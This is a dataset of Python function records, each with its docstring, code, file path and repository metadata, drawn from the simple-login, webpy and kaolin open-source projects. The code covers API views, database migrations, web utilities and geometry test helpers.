{"docstring": "\"\"\"\nAvailable domains for random alias\n\"\"\"\n", "func_signal": "def get_available_domains_for_random_alias():\n", "code": "user = g.user\n\nret = [\n    (is_sl, domain) for is_sl, domain in user.available_domains_for_random_alias()\n]\n\nreturn jsonify(ret)", "path": "app/app/api/views/setting.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.alter_column('refused_email', 'path',\n           existing_type=sa.VARCHAR(length=128),\n           nullable=True)\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_032216_541ce53ab6e9_.py", "commit_date": "2020-03-22 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "\"\"\"\nAvailable domains for random alias\n\"\"\"\n", "func_signal": "def get_available_domains_for_random_alias_v2():\n", "code": "user = g.user\n\nret = [\n    {\"domain\": domain, \"is_custom\": not is_sl}\n    for is_sl, domain in user.available_domains_for_random_alias()\n]\n\nreturn jsonify(ret)", "path": "app/app/api/views/setting.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.add_column(\n    \"users\",\n    sa.Column(\n        \"can_use_pgp\",\n        sa.BOOLEAN(),\n        server_default=sa.text(\"false\"),\n        autoincrement=False,\n        nullable=False,\n    ),\n)\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_031621_91b69dfad2f1_.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('custom_domain',\nsa.Column('id', sa.Integer(), autoincrement=True, nullable=False),\nsa.Column('created_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=False),\nsa.Column('updated_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('user_id', sa.Integer(), nullable=False),\nsa.Column('domain', sa.String(length=128), nullable=False),\nsa.Column('verified', sa.Boolean(), nullable=False),\nsa.ForeignKeyConstraint(['user_id'], ['users.id'], ondelete='cascade'),\nsa.PrimaryKeyConstraint('id'),\nsa.UniqueConstraint('domain')\n)\n# ### end Alembic commands ###", "path": "app/migrations/versions/a8d8aa307b8b_.py", "commit_date": "2019-12-15 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.add_column(\"contact\", sa.Column(\"user_id\", sa.Integer(), nullable=True))\nop.create_foreign_key(\n    None, \"contact\", \"users\", [\"user_id\"], [\"id\"], ondelete=\"cascade\"\n)\nop.add_column(\"email_log\", sa.Column(\"user_id\", sa.Integer(), nullable=True))\nop.create_foreign_key(\n    None, \"email_log\", \"users\", [\"user_id\"], [\"id\"], ondelete=\"cascade\"\n)\nop.add_column(\"file\", sa.Column(\"user_id\", sa.Integer(), nullable=True))\nop.create_foreign_key(\n    None, \"file\", \"users\", [\"user_id\"], [\"id\"], ondelete=\"cascade\"\n)\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_032009_f4b8232fa17e_.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "\"\"\"\nReturn user setting\n\"\"\"\n", "func_signal": "def get_setting():\n", "code": "user = g.user\n\nreturn jsonify(setting_to_dict(user))", "path": "app/app/api/views/setting.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.alter_column('refused_email', 'path',\n           existing_type=sa.VARCHAR(length=128),\n           nullable=False)\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_032216_541ce53ab6e9_.py", "commit_date": "2020-03-22 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_constraint(None, \"file\", type_=\"foreignkey\")\nop.drop_column(\"file\", \"user_id\")\nop.drop_constraint(None, \"email_log\", type_=\"foreignkey\")\nop.drop_column(\"email_log\", \"user_id\")\nop.drop_constraint(None, \"contact\", type_=\"foreignkey\")\nop.drop_column(\"contact\", \"user_id\")\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_032009_f4b8232fa17e_.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('notification',\nsa.Column('id', sa.Integer(), autoincrement=True, nullable=False),\nsa.Column('created_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=False),\nsa.Column('updated_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('user_id', sa.Integer(), nullable=False),\nsa.Column('message', sa.Text(), nullable=False),\nsa.Column('read', sa.Boolean(), nullable=False),\nsa.ForeignKeyConstraint(['user_id'], ['users.id'], ondelete='cascade'),\nsa.PrimaryKeyConstraint('id')\n)\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_052319_00532ac6d4bc_.py", "commit_date": "2020-05-23 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "\"\"\"delete an alias that's already in alias trash\"\"\"\n", "func_signal": "def test_delete_alias_already_in_trash(flask_client):\n", "code": "user = User.create(\n    email=\"a@b.c\",\n    password=\"password\",\n    name=\"Test User\",\n    activated=True,\n    commit=True,\n)\nalias = Alias.create(\n    user_id=user.id,\n    email=\"first@d1.test\",\n    mailbox_id=user.default_mailbox_id,\n    commit=True,\n)\n\n# add the alias to global trash\ndb.session.add(DeletedAlias(email=alias.email))\ndb.session.commit()\n\ndelete_alias(alias, user)\nassert Alias.get_by(email=\"first@d1.test\") is None", "path": "app/tests/test_alias_utils.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_column('users', 'lifetime')\nop.drop_table('lifetime_coupon')\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_010120_d29cca963221_.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "# ### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('authorized_address',\nsa.Column('id', sa.Integer(), autoincrement=True, nullable=False),\nsa.Column('created_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=False),\nsa.Column('updated_at', sqlalchemy_utils.types.arrow.ArrowType(), nullable=True),\nsa.Column('user_id', sa.Integer(), nullable=False),\nsa.Column('mailbox_id', sa.Integer(), nullable=False),\nsa.Column('email', sa.String(length=256), nullable=False),\nsa.ForeignKeyConstraint(['mailbox_id'], ['mailbox.id'], ondelete='cascade'),\nsa.ForeignKeyConstraint(['user_id'], ['users.id'], ondelete='cascade'),\nsa.PrimaryKeyConstraint('id'),\nsa.UniqueConstraint('mailbox_id', 'email', name='uq_authorize_address')\n)\n# ### end Alembic commands ###", "path": "app/migrations/versions/2020_092817_58ad4df8583e_.py", "commit_date": "2020-09-28 00:00:00", "repo_name": "simple-login/app", "stars": 4535, "license": "agpl-3.0", "language": "python", "size": 18022}
{"docstring": "\"\"\"\nIncrements `element` in `dictionary`,\nsetting it to one if it doesn't exist.\n\n    >>> d = {1:2, 3:4}\n    >>> dictincr(d, 1)\n    3\n    >>> d[1]\n    3\n    >>> dictincr(d, 5)\n    1\n    >>> d[5]\n    1\n\"\"\"\n", "func_signal": "def dictincr(dictionary, element):\n", "code": "dictionary.setdefault(element, 0)\ndictionary[element] += 1\nreturn dictionary[element]", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Clears all ThreadedDict instances.\"\"\"\n", "func_signal": "def clear_all():\n", "code": "for t in list(ThreadedDict._instances):\n    t.clear()", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nTries a series of functions and prints their results.\n`context` is a dictionary mapping names to values;\nthe value will only be tried if it's callable.\n\n    >>> tryall(dict(j=lambda: True))\n    j: True\n    ----------------------------------------\n    results:\n       True: 1\n\nFor example, you might have a file `test/stuff.py`\nwith a series of functions testing various things in it.\nAt the bottom, have a line:\n\n    if __name__ == \"__main__\": tryall(globals())\n\nThen you can run `python test/stuff.py` and get the results of\nall the tests.\n\"\"\"\n", "func_signal": "def tryall(context, prefix=None):\n", "code": "context = context.copy()  # vars() would update\nresults = {}\nfor (key, value) in iteritems(context):\n    if not hasattr(value, \"__call__\"):\n        continue\n    if prefix and not key.startswith(prefix):\n        continue\n    print(key + \":\", end=\" \")\n    try:\n        r = value()\n        dictincr(results, r)\n        print(r)\n    except:\n        print(\"ERROR\")\n        dictincr(results, \"ERROR\")\n        print(\"   \" + \"\\n   \".join(traceback.format_exc().split(\"\\n\")))\n\nprint(\"-\" * 40)\nprint(\"results:\")\nfor (key, value) in iteritems(results):\n    print(\" \" * 2, str(key) + \":\", value)", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nRemoves duplicate elements from a list while preserving the order of the rest.\n\n    >>> uniq([9,0,2,1,0])\n    [9, 0, 2, 1]\n\nThe value of the optional `key` parameter should be a function that\ntakes a single argument and returns a key to test the uniqueness.\n\n    >>> uniq([\"Foo\", \"foo\", \"bar\"], key=lambda s: s.lower())\n    ['Foo', 'bar']\n\"\"\"\n", "func_signal": "def uniq(seq, key=None):\n", "code": "key = key or (lambda x: x)\nseen = set()\nresult = []\nfor v in seq:\n    k = key(v)\n    if k in seen:\n        continue\n    seen.add(k)\n    result.append(v)\nreturn result", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Returns the element at index after moving it to the top of stack.\n\n>>> x = [1, 2, 3, 4]\n>>> restack(x)\n1\n>>> x\n[2, 3, 4, 1]\n\"\"\"\n", "func_signal": "def restack(stack, index=0):\n", "code": "x = stack.pop(index)\nstack.append(x)\nreturn x", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nFunction replacement for if-else to use in expressions.\n\n    >>> x = 2\n    >>> cond(x % 2 == 0, \"even\", \"odd\")\n    'even'\n    >>> cond(x % 2 == 0, \"even\", \"odd\") + '_row'\n    'even_row'\n\"\"\"\n", "func_signal": "def cond(predicate, consequence, alternative=None):\n", "code": "if predicate:\n    return consequence\nelse:\n    return alternative", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nFormats `string` according to `pattern`, where the letter X gets replaced\nby characters from `string`.\n\n    >>> denumify(\"8005551212\", \"(XXX) XXX-XXXX\")\n    '(800) 555-1212'\n\n\"\"\"\n", "func_signal": "def denumify(string, pattern):\n", "code": "out = []\nfor c in pattern:\n    if c == \"X\":\n        out.append(string[0])\n        string = string[1:]\n    else:\n        out.append(c)\nreturn \"\".join(out)", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nChecks to see if the page has been modified since the version in the\nrequester's cache.\n\nWhen you publish pages, you can include `Last-Modified` and `ETag`\nwith the date the page was last modified and an opaque token for\nthe particular version, respectively. When readers reload the page,\nthe browser sends along the modification date and etag value for\nthe version it has in its cache. If the page hasn't changed,\nthe server can just return `304 Not Modified` and not have to\nsend the whole page again.\n\nThis function takes the last-modified date `date` and the ETag `etag`\nand checks the headers to see if they match. If they do, it returns\n`True`, or otherwise it raises NotModified error. It also sets\n`Last-Modified` and `ETag` output headers.\n\"\"\"\n", "func_signal": "def modified(date=None, etag=None):\n", "code": "n = set(\n    [x.strip('\" ') for x in web.ctx.env.get(\"HTTP_IF_NONE_MATCH\", \"\").split(\",\")]\n)\nm = net.parsehttpdate(web.ctx.env.get(\"HTTP_IF_MODIFIED_SINCE\", \"\").split(\";\")[0])\nvalidate = False\nif etag:\n    if \"*\" in n or etag in n:\n        validate = True\nif date and m:\n    # we subtract a second because\n    # HTTP dates don't have sub-second precision\n    if date - datetime.timedelta(seconds=1) <= m:\n        validate = True\n\nif date:\n    lastmodified(date)\nif etag:\n    web.header(\"ETag\", '\"' + etag + '\"')\nif validate:\n    raise web.notmodified()\nelse:\n    return True", "path": "webpy/web/http.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nImagine you're at `/foo?a=1&b=2`. Then `changequery(a=3)` will return\n`/foo?a=3&b=2` -- the same URL but with the arguments you requested\nchanged.\n\"\"\"\n", "func_signal": "def changequery(query=None, **kw):\n", "code": "if query is None:\n    query = web.rawinput(method=\"get\")\nfor k, v in iteritems(kw):\n    if v is None:\n        query.pop(k, None)\n    else:\n        query[k] = v\nout = web.ctx.path\nif query:\n    out += \"?\" + urlencode(query, doseq=True)\nreturn out", "path": "webpy/web/http.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nMakes url by concatenating web.ctx.homepath and path and the\nquery string created using the arguments.\n\"\"\"\n", "func_signal": "def url(path=None, doseq=False, **kw):\n", "code": "if path is None:\n    path = web.ctx.path\nif path.startswith(\"/\"):\n    out = web.ctx.homepath + path\nelse:\n    out = path\n\nif kw:\n    out += \"?\" + urlencode(kw, doseq=doseq)\n\nreturn out", "path": "webpy/web/http.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nConverts a (UTC) datetime object to a nice string representation.\n\n    >>> from datetime import datetime, timedelta\n    >>> d = datetime(1970, 5, 1)\n    >>> datestr(d, now=d)\n    '0 microseconds ago'\n    >>> for t, v in iteritems({\n    ...   timedelta(microseconds=1): '1 microsecond ago',\n    ...   timedelta(microseconds=2): '2 microseconds ago',\n    ...   -timedelta(microseconds=1): '1 microsecond from now',\n    ...   -timedelta(microseconds=2): '2 microseconds from now',\n    ...   timedelta(microseconds=2000): '2 milliseconds ago',\n    ...   timedelta(seconds=2): '2 seconds ago',\n    ...   timedelta(seconds=2*60): '2 minutes ago',\n    ...   timedelta(seconds=2*60*60): '2 hours ago',\n    ...   timedelta(days=2): '2 days ago',\n    ... }):\n    ...     assert datestr(d, now=d+t) == v\n    >>> datestr(datetime(1970, 1, 1), now=d)\n    'January  1'\n    >>> datestr(datetime(1969, 1, 1), now=d)\n    'January  1, 1969'\n    >>> datestr(datetime(1970, 6, 1), now=d)\n    'June  1, 1970'\n    >>> datestr(None)\n    ''\n\"\"\"\n\n", "func_signal": "def datestr(then, now=None):\n", "code": "def agohence(n, what, divisor=None):\n    if divisor:\n        n = n // divisor\n\n    out = str(abs(n)) + \" \" + what  # '2 days'\n    if abs(n) != 1:\n        out += \"s\"  # '2 days'\n\n    out += \" \"  # '2 days '\n    if n < 0:\n        out += \"from now\"\n    else:\n        out += \"ago\"\n    return out  # '2 days ago'\n\noneday = 24 * 60 * 60\n\nif not then:\n    return \"\"\n\nif not now:\n    now = datetime.datetime.utcnow()\n\nif type(now).__name__ == \"DateTime\":\n    now = datetime.datetime.fromtimestamp(now)\n\nif type(then).__name__ == \"DateTime\":\n    then = datetime.datetime.fromtimestamp(then)\nelif type(then).__name__ == \"date\":\n    then = datetime.datetime(then.year, then.month, then.day)\n\ndelta = now - then\ndeltaseconds = int(delta.days * oneday + delta.seconds + delta.microseconds * 1e-06)\ndeltadays = abs(deltaseconds) // oneday\nif deltaseconds < 0:\n    deltadays *= -1  # fix for oddity of floor\n\nif deltadays:\n    if abs(deltadays) < 4:\n        return agohence(deltadays, \"day\")\n\n    # Trick to display 'June 3' instead of 'June 03'\n    # Even though the %e format in strftime does that, it doesn't work on Windows.\n    out = then.strftime(\"%B %d\").replace(\" 0\", \"  \")\n\n    if then.year != now.year or deltadays < 0:\n        out += \", %s\" % then.year\n    return out\n\nif int(deltaseconds):\n    if abs(deltaseconds) > (60 * 60):\n        return agohence(deltaseconds, \"hour\", 60 * 60)\n    elif abs(deltaseconds) > 60:\n        return agohence(deltaseconds, \"minute\", 60)\n    else:\n        return agohence(deltaseconds, \"second\")\n\ndeltamicroseconds = delta.microseconds\nif delta.days:\n    deltamicroseconds = int(delta.microseconds - 1e6)  # datetime oddity\n\nif abs(deltamicroseconds) > 1000:\n    return agohence(deltamicroseconds, \"millisecond\", 1000)\n\nreturn agohence(deltamicroseconds, \"microsecond\")", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nAdd commas to an integer `n`.\n\n    >>> commify(1)\n    '1'\n    >>> commify(123)\n    '123'\n    >>> commify(-123)\n    '-123'\n    >>> commify(1234)\n    '1,234'\n    >>> commify(1234567890)\n    '1,234,567,890'\n    >>> commify(123.0)\n    '123.0'\n    >>> commify(1234.5)\n    '1,234.5'\n    >>> commify(1234.56789)\n    '1,234.56789'\n    >>> commify(' %.2f ' % -1234.5)\n    '-1,234.50'\n    >>> commify(None)\n    >>>\n\n\"\"\"\n", "func_signal": "def commify(n):\n", "code": "if n is None:\n    return None\n\nn = str(n).strip()\n\nif n.startswith(\"-\"):\n    prefix = \"-\"\n    n = n[1:].strip()\nelse:\n    prefix = \"\"\n\nif \".\" in n:\n    dollars, cents = n.split(\".\")\nelse:\n    dollars, cents = n, None\n\nr = []\nfor i, c in enumerate(str(dollars)[::-1]):\n    if i and (not (i % 3)):\n        r.insert(0, \",\")\n    r.insert(0, c)\nout = \"\".join(r)\nif cents:\n    out += \".\" + cents\nreturn prefix + out", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Returns the element at index after moving it to the beginning of the queue.\n\n>>> x = [1, 2, 3, 4]\n>>> requeue(x)\n4\n>>> x\n[4, 1, 2, 3]\n\"\"\"\n", "func_signal": "def requeue(queue, index=-1):\n", "code": "x = queue.pop(index)\nqueue.insert(0, x)\nreturn x", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Outputs basic profiling information at the bottom of each response.\"\"\"\n", "func_signal": "def profiler(app):\n", "code": "from utils import profile\n\ndef profile_internal(e, o):\n    out, result = profile(app)(e, o)\n    return list(out) + [\"<pre>\" + net.websafe(result) + \"</pre>\"]\n\nreturn profile_internal", "path": "webpy/web/http.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Returns the first element of the iterator or None when there are no\nelements.\n\nIf the optional argument default is specified, that is returned instead\nof None when there are no elements.\n\"\"\"\n", "func_signal": "def first(self, default=None):\n", "code": "try:\n    return next(iter(self))\nexcept StopIteration:\n    return default", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "# Assuming all templates are html\n", "func_signal": "def __getattr__(self, name):\n", "code": "path = name + \".html\"\n\nif self._type == \"text\":\n    from genshi.template import TextTemplate\n\n    cls = TextTemplate\n    type = \"text\"\nelse:\n    cls = None\n    type = self._type\n\nt = self._loader.load(path, cls=cls)\n\ndef template(**kw):\n    stream = t.generate(**kw)\n    if type:\n        return stream.render(type)\n    else:\n        return stream.render()\n\nreturn template", "path": "webpy/web/contrib/template.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nFormats an ordinal.\nDoesn't handle negative numbers.\n\n    >>> nthstr(1)\n    '1st'\n    >>> nthstr(0)\n    '0th'\n    >>> [nthstr(x) for x in [2, 3, 4, 5, 10, 11, 12, 13, 14, 15]]\n    ['2nd', '3rd', '4th', '5th', '10th', '11th', '12th', '13th', '14th', '15th']\n    >>> [nthstr(x) for x in [91, 92, 93, 94, 99, 100, 101, 102]]\n    ['91st', '92nd', '93rd', '94th', '99th', '100th', '101st', '102nd']\n    >>> [nthstr(x) for x in [111, 112, 113, 114, 115]]\n    ['111th', '112th', '113th', '114th', '115th']\n\n\"\"\"\n\n", "func_signal": "def nthstr(n):\n", "code": "assert n >= 0\nif n % 100 in [11, 12, 13]:\n    return \"%sth\" % n\nreturn {1: \"%sst\", 2: \"%snd\", 3: \"%srd\"}.get(n % 10, \"%sth\") % n", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Returns the keys with minimum count.\"\"\"\n", "func_signal": "def least(self):\n", "code": "m = min(self.itervalues())\nreturn [k for k, v in iteritems(self) if v == m]", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"\nReturns `integer` as an int or `default` if it can't.\n\n    >>> intget('3')\n    3\n    >>> intget('3a')\n    >>> intget('3a', 0)\n    0\n\"\"\"\n", "func_signal": "def intget(integer, default=None):\n", "code": "try:\n    return int(integer)\nexcept (TypeError, ValueError):\n    return default", "path": "webpy/web/utils.py", "commit_date": "2020-09-14 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "# Assuming all templates end with .html\n", "func_signal": "def __getattr__(self, name):\n", "code": "path = name + \".html\"\nt = self._lookup.get_template(path)\nreturn t.render", "path": "webpy/web/contrib/template.py", "commit_date": "2020-03-23 00:00:00", "repo_name": "webpy/webpy", "stars": 5866, "license": "other", "language": "python", "size": 1752}
{"docstring": "\"\"\"Decorator to fix the seed of a function.\n\nArgs:\n    torch_seed (int): The desired seed for torch module.\n    random_seed (int): The desired seed for random module. Default: torch_seed value.\n    numpy_seed (int): The desired seed for numpy module. Default: torch_seed value.\n\"\"\"\n", "func_signal": "def with_seed(torch_seed=0, numpy_seed=None, random_seed=None):\n", "code": "def decorator(orig_test):\n    @functools.wraps(orig_test)\n    def orig_test_wrapper(*args, **kwargs):\n        torch_state, random_state, np_state = random.get_state()\n        random.manual_seed(torch_seed, numpy_seed, random_seed)\n        output = orig_test(*args, **kwargs)\n        random.set_state(torch_state, random_state, np_state)\n        return output\n    return orig_test_wrapper\nreturn decorator", "path": "kaolin/kaolin/utils/testing.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# Rescale points\n", "func_signal": "def query(self, points):\n", "code": "points = self.rescale(points)\n\n# placeholder result with no hits we'll fill in later\ncontains = np.zeros(len(points), dtype=np.bool)\n\n# cull points outside of the axis aligned bounding box\n# this avoids running ray tests unless points are close\ninside_aabb = np.all(\n    (0 <= points) & (points <= self.resolution), axis=1)\nif not inside_aabb.any():\n    return contains\n\n# Only consider points inside bounding box\nmask = inside_aabb\npoints = points[mask]\n\n# Compute intersection depth and check order\npoints_indices, tri_indices = self._tri_intersector2d.query(\n    points[:, :2])\n\ntriangles_intersect = self._triangles[tri_indices]\npoints_intersect = points[points_indices]\n\ndepth_intersect, abs_n_2 = self.compute_intersection_depth(\n    points_intersect, triangles_intersect)\n\n# Count number of intersections in both directions\nsmaller_depth = depth_intersect >= points_intersect[:, 2] * abs_n_2\nbigger_depth = depth_intersect < points_intersect[:, 2] * abs_n_2\npoints_indices_0 = points_indices[smaller_depth]\npoints_indices_1 = points_indices[bigger_depth]\n\nnintersect0 = np.bincount(points_indices_0, minlength=points.shape[0])\nnintersect1 = np.bincount(points_indices_1, minlength=points.shape[0])\n\n# Check if point contained in mesh\ncontains1 = (np.mod(nintersect0, 2) == 1)\ncontains2 = (np.mod(nintersect1, 2) == 1)\n# if (contains1 != contains2).any():\n#     print('Warning: contains1 != contains2 for some points.')\ncontains[mask] = (contains1 & contains2)\nreturn contains", "path": "kaolin/kaolin/ops/mesh/check_sign.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# shape: (batch_size, 3)\n", "func_signal": "def object_pos(self, batch_size, device):\n", "code": "return torch.tensor([[0, 0, 0]], dtype=torch.float,\n                    device=device).repeat(batch_size, 1)", "path": "kaolin/tests/python/kaolin/render/test_camera.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# batched dot product\n", "func_signal": "def _compute_dot(p1, p2):\n", "code": "return torch.bmm(p1.view(p1.shape[0], 1, 3),\n                 p2.view(p2.shape[0], 3, 1)).view(-1)", "path": "kaolin/kaolin/metrics/trianglemesh.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# Test for gradient accumulation w.r.t p2\n", "func_signal": "def test_grad_check_2(self, device, dtype, get_input):\n", "code": "if dtype != torch.double:\n    pytest.skip(\"Gradient check only works in double.\")\n\np1, p2 = get_input\np1.requires_grad = True\np2.requires_grad = True\n\ngrad_result = torch.autograd.gradcheck(pc.sided_distance, (p1, p2), eps=1e-6, atol=1e-6)\n\nassert grad_result", "path": "kaolin/tests/python/kaolin/metrics/test_pointcloud.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# shape: (3, 1)\n# we support arbitrary height and width\n", "func_signal": "def test_camera_proj(self, batch_size, height, width, device, camera_fovy):\n", "code": "mtx_proj = generate_perspective_projection(camera_fovy,\n                                           ratio=width / height)\nmtx_proj = mtx_proj.to(device)\n\nmtx_proj2 = torch.tensor([[2.5 / (width / height)], [2.5], [-1]],\n                         dtype=torch.float,\n                         device=device)\nnRet = torch.allclose(mtx_proj,\n                      mtx_proj2,\n                      rtol=1e-05,\n                      atol=1e-08,\n                      equal_nan=False)\nassert nRet", "path": "kaolin/tests/python/kaolin/render/test_camera.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# if test_gradcheck passed the gradient using torch.double inputs is trustable\n", "func_signal": "def target_grad_double_2(self, get_input):\n", "code": "p1, p2 = get_input\np1 = p1.detach()\np2 = p2.detach()\np1.requires_grad = True\np2.requires_grad = True\n\noutputs = torch.sum(pc.sided_distance(p1, p2)[0])\noutputs.backward()\nreturn p1.grad.clone(), p2.grad.clone()", "path": "kaolin/tests/python/kaolin/metrics/test_pointcloud.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# shape: (batch_size, 3)\n", "func_signal": "def camera_pos(self, batch_size, device):\n", "code": "return torch.tensor([[0, 0, 4]], dtype=torch.float,\n                    device=device).repeat(batch_size, 1)", "path": "kaolin/tests/python/kaolin/render/test_camera.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
{"docstring": "# gradcheck only for double\n", "func_signal": "def test_gradcheck(self, numel_per_tensor, total_numel):\n", "code": "inputs = torch.rand((total_numel, 1), dtype=torch.double, device='cuda',\n                    requires_grad=True)\ntorch.autograd.gradcheck(reduction._PackedSimpleSumCuda.apply,\n                         (inputs, numel_per_tensor))", "path": "kaolin/tests/python/kaolin/ops/test_reduction.py", "commit_date": "2020-12-09 00:00:00", "repo_name": "NVIDIAGameWorks/kaolin", "stars": 4135, "license": "apache-2.0", "language": "python", "size": 111650}
